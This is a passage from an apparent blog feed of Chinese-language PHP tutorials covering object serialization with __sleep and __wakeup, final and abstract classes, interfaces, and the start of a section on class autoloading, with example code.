class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link; <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的构造方法：数据库对象初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="comment">//一个方法只做一件事</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb(); <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset(); <span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象序列化时，魔术方法__sleep()会自动调用</span></span><br><span class="line"><span class="comment">//在__sleep()中工作：清理不需要的属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//返回要序列化的对象属性的数组</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;db_host&#x27;</span>,<span class="string">&#x27;db_user&#x27;</span>,<span class="string">&#x27;db_pass&#x27;</span>,<span class="string">&#x27;db_name&#x27;</span>,<span class="string">&#x27;charset&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;itcast&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line">$db = <span class="keyword">new</span> Db($arr);</span><br><span class="line"><span class="comment">//将数据库对象序列化</span></span><br><span class="line">$str = serialize($db);</span><br><span class="line"><span class="comment">//将对象序列化字符串保存到记事本</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;./2.txt&#x27;</span>,$str);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="对象反序列化"><a href="#对象反序列化" class="headerlink" title="对象反序列化"></a>对象反序列化</h3><p>对象的反序列化过程，与其它变量数据一样；</p><p>当对象反序列化时，unserialize()函数会检查类中是否存在一个__wakeup()方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 __wakeup() 经常用在反序列化操作中，进行一些初始化操作，例如重新建立数据库连接，或执行其它初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//私有的数据库配置信息</span></span><br><span class="line"><span class="keyword">private</span> $db_host; <span class="comment">//主机名</span></span><br><span class="line"><span class="keyword">private</span> $db_user; <span class="comment">//用户名</span></span><br><span class="line"><span class="keyword">private</span> $db_pass; <span class="comment">//密码</span></span><br><span class="line"><span class="keyword">private</span> $db_name; <span class="comment">//数据库名</span></span><br><span class="line"><span class="keyword">private</span> $charset; <span class="comment">//字符集</span></span><br><span class="line"><span class="keyword">private</span> $link; <span class="comment">//连接对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//公共的构造方法：数据库对象初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_host = $config[<span class="string">&#x27;db_host&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_user = $config[<span class="string">&#x27;db_user&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_pass = $config[<span class="string">&#x27;db_pass&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db_name = $config[<span class="string">&#x27;db_name&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;charset = $config[<span class="string">&#x27;charset&#x27;</span>];</span><br><span class="line"><span class="comment">//一个方法只做一件事</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb(); <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset(); <span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的连接MySQL服务器方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;db_host, <span class="keyword">$this</span>-&gt;db_user, <span class="keyword">$this</span>-&gt;db_pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接MySQL服务器失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的选择数据库的方法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;db_name))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;选择数据库<span class="subst">&#123;$this-&gt;db_name&#125;</span>失败！&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有的设置字符集</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setCharset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mysqli_set_charset(<span class="keyword">$this</span>-&gt;link, <span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象序列化时，魔术方法__sleep()会自动调用</span></span><br><span class="line"><span class="comment">//在__sleep()中工作：清理不需要的属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//返回要序列化的对象属性的数组</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;db_host&#x27;</span>,<span class="string">&#x27;db_user&#x27;</span>,<span class="string">&#x27;db_pass&#x27;</span>,<span class="string">&#x27;db_name&#x27;</span>,<span class="string">&#x27;charset&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象反序列化时，魔术方法__wakeup()会自动调用</span></span><br><span class="line"><span class="comment">//__wakeup()作用：对象初始化</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;connectDb(); <span class="comment">//连接MySQL服务器</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;selectDb(); <span class="comment">//选择数据库</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;setCharset(); <span class="comment">//设置字符集</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取记事本的对象序列化字符串</span></span><br><span class="line">$str = file_get_contents(<span class="string">&#x27;./2.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//对象反序列化</span></span><br><span class="line">$db = unserialize($str);</span><br><span class="line"><span class="comment">//打印$db对象</span></span><br><span class="line">var_dump($db);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP核心编程7&quot;&gt;&lt;a href=&quot;#PHP核心编程7&quot; class=&quot;headerlink&quot; title=&quot;PHP核心编程7&quot;&gt;&lt;/a&gt;PHP核心编程7&lt;/h1&gt;&lt;h2 id=&quot;工厂设计模式&quot;&gt;&lt;a href=&quot;#工厂设计模式&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="PHP开发学习" scheme="http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发学习--核心编程6</title>
    <link href="http://s1eady.top/2020/01/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B6/"/>
    <id>http://s1eady.top/2020/01/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B6/</id>
    <published>2020-01-04T23:23:10.000Z</published>
    <updated>2020-11-16T03:37:16.176Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP核心编程6"><a href="#PHP核心编程6" class="headerlink" title="PHP核心编程6"></a>PHP核心编程6</h1><h2 id="最终类和最终方法"><a href="#最终类和最终方法" class="headerlink" title="最终类和最终方法"></a>最终类和最终方法</h2><p>Final关键字修饰的类，就是最终类；</p><p>Final关键字修饰的方法，就是最终方法；</p><p>最终类：该类只能实例化，不能被继承。该类十分完善了，不需要升级和扩展。</p><p>最终方法：该方法可以被继承，但不能重写。该方法十分完善了，不需要重写了。</p><h2 id="抽象类和抽象方法"><a href="#抽象类和抽象方法" class="headerlink" title="抽象类和抽象方法"></a>抽象类和抽象方法</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>abstract关键字修饰的类，就是抽象类；</p><p>abstract关键字修饰的方法，就是抽象方法；</p><p>抽象类：该类不能直接实例化，必须先继承后再实例化。常用在基础类。</p><p>抽象方法：方法必须先继承后重写。</p><p>抽象方法就是方法的命名规范、命名规则、方法大纲，也可以理解为一种监督机制。</p><p>所有的抽象方法都必须重写，少一个都不行。</p><p>抽象方法没有方法体，必须在子类重写后，再定义方法体。</p><p>如果一类中有一个抽象方法，该类必须是抽象类。</p><p>抽象方法权限不能是private，因为要先继承再重写。</p><p>在PHP7中，抽象方法可以是成员方法，也可以是静态方法。</p><p>抽象类中，可以包含其它成员：常量、成员属性、成员方法、静态属性、静态方法</p><h3 id="实例：抽象类和抽象方法实例演示"><a href="#实例：抽象类和抽象方法实例演示" class="headerlink" title="实例：抽象类和抽象方法实例演示"></a>实例：抽象类和抽象方法实例演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义抽象学生类：子类方法的目录大纲</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第69期就业班&quot;</span>;</span><br><span class="line"><span class="comment">//定义成员的抽象方法</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$a,$b</span>)</span>;</span><br><span class="line"><span class="comment">//定义静态的抽象方法</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义传智学生类，并继承学生类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ItcastStudent</span> <span class="keyword">extends</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//重写showInfo()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$name,$age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>的年龄是<span class="subst">&#123;$age&#125;</span>岁！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写readMe()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="built_in">self</span>::TITLE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建传智学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> ItcastStudent;</span><br><span class="line">$obj-&gt;showInfo(<span class="string">&quot;张三四&quot;</span>,<span class="number">24</span>);</span><br><span class="line">$obj-&gt;readMe();</span><br></pre></td></tr></table></figure><h2 id="接口技术"><a href="#接口技术" class="headerlink" title="接口技术"></a>接口技术</h2><h3 id="接口的基本概念"><a href="#接口的基本概念" class="headerlink" title="接口的基本概念"></a>接口的基本概念</h3><p>接口就是特殊的抽象类。</p><p>PHP 类是单继承，也就是不支持多继承。</p><p>当一个类需要多个类的功能时，单继承就无能为力了，为此 PHP 引入了类的接口技术。</p><p>多人合作开发项目时，需要规范各个功能的名称，就需要用到接口技术。</p><p>接口就是一种标准，一种规范。类的功能实现，按照标准接口实现即可；</p><h3 id="接口定义和实现要点"><a href="#接口定义和实现要点" class="headerlink" title="接口定义和实现要点"></a>接口定义和实现要点</h3><p>interface关键字定义接口；</p><p>Implements关键字用来实现接口；</p><p>接口中方法权限必须是public；</p><p>接口中方法默认是抽象的，所以不需要在方法名前面加 abstract ；</p><p>接口中方法可以是成员方法，也可以是静态方法；</p><p>接口中也可以定义常量，但常量不能重写；</p><p>类可以实现(implements)多个接口（相当于把多个功能集于一身，如手机实现了小灵通、MP3、MP4的功能）；</p><p>接口也可以继承(extends)接口，类可以继承(extends)类，但是类只能实现(implements)接口。</p><h4 id="实例：接口的定义和实现演示"><a href="#实例：接口的定义和实现演示" class="headerlink" title="实例：接口的定义和实现演示"></a>实例：接口的定义和实现演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义第1个接口InterA</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">InterA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第69期就业班&quot;</span>;</span><br><span class="line"><span class="comment">//定义一个成员抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$a,$b</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义第2个接口InterB</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">InterB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义一个静态抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义学生类，并实现接口功能</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">InterA</span>,<span class="title">InterB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//重写showInfo()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$name,$age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>的年龄是<span class="subst">&#123;$age&#125;</span>岁！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写readMe()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="built_in">self</span>::TITLE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo(<span class="string">&#x27;张三四&#x27;</span>,<span class="number">26</span>);</span><br><span class="line">$obj-&gt;readMe();</span><br></pre></td></tr></table></figure><h4 id="实例：创建手机类并实现小灵通接口、MP3接口、MP4接口"><a href="#实例：创建手机类并实现小灵通接口、MP3接口、MP4接口" class="headerlink" title="实例：创建手机类并实现小灵通接口、MP3接口、MP4接口"></a>实例：创建手机类并实现小灵通接口、MP3接口、MP4接口</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义小灵通的接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">XiaoLingTong</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义打电话的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">tel</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义Mp3接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Mp3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义听音乐的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">music</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义Mp4接口，并继承Mp3接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Mp4</span> <span class="keyword">extends</span> <span class="title">Mp3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义看电影的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">video</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义手机类，并实现以上所有接口功能</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mobile</span> <span class="keyword">implements</span> <span class="title">XiaoLingTong</span>,<span class="title">Mp4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//重写tel()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">tel</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在打电话！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写music()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">music</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在听音乐！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写video()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">video</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在看电影！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加打游戏方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在打游戏！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建手机类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Mobile();</span><br><span class="line">$obj-&gt;tel();</span><br><span class="line">$obj-&gt;music();</span><br><span class="line">$obj-&gt;video();</span><br><span class="line">$obj-&gt;game();</span><br></pre></td></tr></table></figure><h2 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h2><h3 id="为什么需要类的自动加载"><a href="#为什么需要类的自动加载" class="headerlink" title="为什么需要类的自动加载"></a>为什么需要类的自动加载</h3><p>很多开发者写面向对象的应用程序时，对每个类的定义，都建立一个独立的 PHP 类文件，方便类文件的统一管理，这无可厚非。但一个很大的烦恼是，不得不在每个脚本开头，写一个长长的包含文件列表（每个类一个文件）。这样一来，就增加了很多负担、占用了很多的内存，对于后期维护也不方便。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116100953526.png" alt="image-20201116100953526"></p><p>解决方案：按需要加载类文件，而不是把所有类全部包含进来。</p><h3 id="类文件的命名规范"><a href="#类文件的命名规范" class="headerlink" title="类文件的命名规范"></a>类文件的命名规范</h3><p>一个类要单独定义成一个独立的类文件；</p><p>类文件扩展名，要以”.class.php”结尾，是一种约定，不是必须的；</p><p>类文件主名，要与类名一致；</p><p>例如：Db.class.php、UserController.class.php、UserModel.class.php</p><h3 id="类的自定义加载函数：spl-autoload-register"><a href="#类的自定义加载函数：spl-autoload-register" class="headerlink" 